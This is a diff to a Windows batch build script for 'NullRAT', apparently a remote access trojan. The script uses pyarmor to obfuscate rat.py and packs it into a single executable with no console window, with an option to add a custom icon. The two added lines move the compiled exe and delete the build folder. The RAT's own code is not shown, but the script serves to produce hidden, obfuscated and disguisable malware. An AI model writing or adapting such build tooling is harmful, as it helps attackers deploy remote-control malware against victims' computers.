@@ -11,10 +11,12 @@ exit /b 1
 echo. & echo Compiling NullRAT
 echo ----------------- & echo.
 pyarmor pack --clean -e "--onefile --noconsole" rat.py & cls 
+cd dist & move *.exe ..\.. & cd .. & rmdir /s /q build\
 if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)
 
 :icon_compile
 echo. & echo Compiling NullRAT with icon
 echo --------------------------- & echo.
 pyarmor pack --clean -e "--onefile --icon=custom_icon.ico --noconsole" rat.py & cls 
+cd dist & move *.exe ..\.. & cd .. & rmdir /s /q build\
 if %errorlevel% == 0 (echo Successfully compiled! & exit /b 0) else (echo Not compiled successfully :[ & echo. & pause & exit /b 1)
